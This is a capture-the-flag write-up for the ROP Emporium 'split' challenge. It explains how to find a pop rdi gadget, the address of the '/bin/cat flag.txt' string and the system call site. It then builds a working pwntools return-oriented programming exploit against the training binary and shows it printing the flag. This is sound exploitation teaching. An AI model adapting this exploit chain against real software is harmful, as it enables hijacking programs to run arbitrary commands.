# split

in this challenge we try to call system("/bin/cat flag.txt") but this time we have to pass the string to the function. [challenge](https://ropemporium.com/challenge/split.html)

## Understanding

in this challenge we redirect execution just like the previous challenge, except that we chain multiple address instead of just one by redirecting just before `ret` instruction to call addresses from the stack multiple times, first is to load the address of an argument of `system`, second is to load a string address (system arg) `"/bin/cat flag.txt"` and the third is to `system` address.

## Objective

1. find pattern length (same as previous challenge).
2. find how system takes an argument.
3. find system and the string to be executed.
4. find a way to load the string address into a register that's passed as an argument and that triggers `ret` right after.
5. chain the ropes.
6. exploit.

## Understanding system() function

we can check manual:
```
$ man system
```

```
SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);

DESCRIPTION
       The  system()  library  function  uses fork(2) to create a child process
       that executes the shell command specified in command using  execl(3)  as
       follows:

           execl("/bin/sh", "sh", "-c", command, (char *) NULL);

       system() returns after the command has been completed.

       During execution of the command, SIGCHLD will be blocked, and SIGINT and
       SIGQUIT will be ignored, in the process  that  calls  system().   (These
       signals  will  be  handled  according to their defaults inside the child
       process that executes command.)

       If command is NULL, then system() returns a status indicating whether  a
       shell is available on the system.
```

this tells us the system take a string as an argument and execute it, example:
```
system("echo hello");
system("ls");
```

* how system is executed

we can use the binary from the previous challenge `ret2win`, inside that binary there was a function also called `ret2win` and inside this function it was calling `system("/bin/cat flag.txt")

we'll see how it called the argument.

if we disassemble ret2win using `disass ret2win` we'll see this:
```
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
=> 0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret
```

before calling system it's moving the address `0x400943` to `edi` in:
`=> 0x0000000000400764 <+14>:    mov    edi,0x400943`

let's examine and check what `0x400943` contains:

```
gef➤  x/s 0x400943
0x400943:       "/bin/cat flag.txt"
```
as we can see it the string

so inside `ret2win` it was calling `system("/bin/cat flag.txt")`

Now we know that `edi` is `system` argument

so:
`load string address to edi`
`jump to system`

system will do its magic and execute the string.

* what instructions we need:

after following same way to know how many bytes (characters) we need for the pattern before the return address:

the only part we control is the stack, so the instructions we need must be using the stack.

`we don't need to worry about writing to the stack cause read function handle that for us (check precious challenge for read that takes input and load it to the stack).`
1. we need an instruction that load from the stack to a register, in this case rdi (which is edi, edi==>32bit lower part from rdi):
	- the part we need get from the stack is the address of the string "/bin/cat flag.txt"
	- we can use the instruction [pop](https://c9x.me/x86/html/file_module_x86_id_248.html) that load what ever in the stack into a register or an address
		- so we need to pop rdi (get address from stack and put it in rdi/edi).
2. we need to execute system.
	- we can search for an address where system is called.

* finally:

roping all that together for our payload to look:
`pattern + pop_rdi_addr + bin_cat_string_address + system_call_address`
`pattern is 40 ==> pattern = "A"\*40`

## Recon

same as previous [challenge](https://ropemporium.com/challenge/split.html)

running `readelf -s split` you'll notice a function called `usefulFunction` which calls `system`

- Note
if you do the same as the last video and return to that function you'll receive the output of ls, which lists the current directory files and folders

we need to make it read the flag.txt instead using /bin/cat flag.txt string

## Execution

* using gdb to examine the addresses we need.

1. finding the address system inside `usefulFunction`

```
gef➤  disass usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret    
End of assembler dump.
```

system is being called at `0x000000000040074b`

`system address = 0x000000000040074b`

2. find the address of `pop rdi`:

we're looking for an address in the program that executes instruction as follow:
```
	pop rdi
	ret
```

to find that instruction address you can use [radare2](https://github.com/radareorg/radare2):

run the file in radare2
```
$ r2 split
```

to find all th:
```
[0x004005b0]> /R pop rdi;ret
  0x004007c3                 5f  pop rdi
  0x004007c4                 c3  ret
```

`radare2` has found an address of the instruction for us and the address is `0x004007c3`
so:
`pop_rdi_address = 0x004007c3`

3. find the string `/bin/cat flag.txt` in the binary:

to do so, inside gdb we simply run `grep "/bin/cat flag.txt"`:
```
gef➤  grep "/bin/cat flag.txt"
[+] Searching '/bin/cat flag.txt' in memory
[+] In '/home/kali/CTFs-writeups/ropemporium/split/split'(0x601000-0x602000), permission=rw-
  0x601060 - 0x601071  →   "/bin/cat flag.txt"
```
- Note:
this command only run if you have `gef` installed and program should be running, otherwise you'll have to check `$ info proc map` to find the address range and then in gdb  `gdb> find 0xSTARTADDRESS,0xENDADDREES,"/bin/cat flag.txt"`

so:
`string_address = 0x601060`

## Writing exploit

in a file called [exploit.py]()

again, using [pwntools](http://docs.pwntools.com/en/stable/) on python3.

* Imports:

```python3
from pwn import process, p64
```

* Setting variables:

```python3
pop_rdi_ret  = p64(0x4007c3)    # pop rdi; ret instruction address
bin_cat_flag = p64(0x601060)    # /bin/cat flag.txt address
_system      = p64(0x40074b)    # system call address
```

* Running file:

```python3
p = process("./split")
```

* Receiving output:

```python3
print(p.recvuntil("> ").decode("latin-1"))
```

* Crafting the payload:

```python3
payload = b"A"*40
payload += pop_rdi_ret
payload += bin_cat_flag
payload += _system
```

* Sending the payload:

```python3
p.sendline(payload)
```

* Receving and printing:

```python3
print(p.clean().decode("latin-1"))
```

* Running the script:


```
$ python3 exploit.py
[+] Starting local process './split': pid 22483
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> 
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

And we got the flag!
